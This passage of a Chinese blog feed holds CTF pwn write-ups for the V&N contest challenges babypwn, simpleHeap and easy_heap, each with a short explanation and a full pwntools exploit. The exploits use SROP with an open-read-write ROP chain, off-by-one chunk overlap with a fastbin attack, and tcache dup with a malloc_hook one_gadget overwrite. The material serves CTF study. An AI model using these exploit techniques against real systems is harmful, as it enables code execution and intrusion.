class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
